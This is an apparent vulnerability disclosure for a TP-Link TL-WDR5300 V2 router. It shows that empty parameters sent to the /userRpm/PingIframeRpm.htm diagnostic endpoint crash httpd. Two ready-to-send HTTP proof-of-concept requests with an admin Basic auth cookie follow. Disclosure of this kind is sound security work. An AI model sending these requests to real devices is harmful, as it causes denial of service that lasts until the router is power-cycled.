# TL-WDR5300 V2
Manufacturer: TP-Link

Model: TL-WDR5300 V2.0

Firmware Version: 3.13.35 Build 140311 Rel.34971n

# Vulnerability Overview
Title: Multiple Improper Input Validation Vulnerabilities in Diagnostic Module

Description: The diagnostic endpoint /userRpm/PingIframeRpm.htm lacks proper validation for multiple parameters, leading to a NULL Pointer Dereference or Process Crash. 
Specifically, omitting or providing empty values for the following parameters triggers an immediate segmentation fault in the httpd daemon:

isNew
sendNum
pSize
overTime

Impact: Persistent Denial of Service (DoS)

Upon sending the malformed request (either the overflow payload or empty parameters), the httpd daemon encounters a Segmentation Fault. Since the httpd service is responsible for the web management interface, the router becomes completely inaccessible via the browser. 
This results in a persistent Denial of Service, requiring a physical power cycle to restore administrative access.


# POC1
```
GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&doType=ping&isNew=&sendNum=4&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.1.1/userRpm/WanDynamicIpCfgRpm.htm?wantype=0&mtu=1500&hostName=TL-WDR5300&downBandwidth=100000&upBandwidth=100000&Save=%B1%A3+%B4%E6

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D

Connection: close
```
# poc2
```
GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&doType=ping&isNew=new&sendNum=&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.1.1/userRpm/WanDynamicIpCfgRpm.htm?wantype=0&mtu=1500&hostName=TL-WDR5300&downBandwidth=100000&upBandwidth=100000&Save=%B1%A3+%B4%E6

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D

Connection: close
```
POC omitting the remaining two parameters




<img width="1419" height="786" alt="image" src="https://github.com/user-attachments/assets/e7826ee8-78c0-4ea0-8fe6-74d244eaac5a" />
<img width="1287" height="764" alt="image" src="https://github.com/user-attachments/assets/c86d1592-21e3-4175-9880-0bd45f5f92c0" />


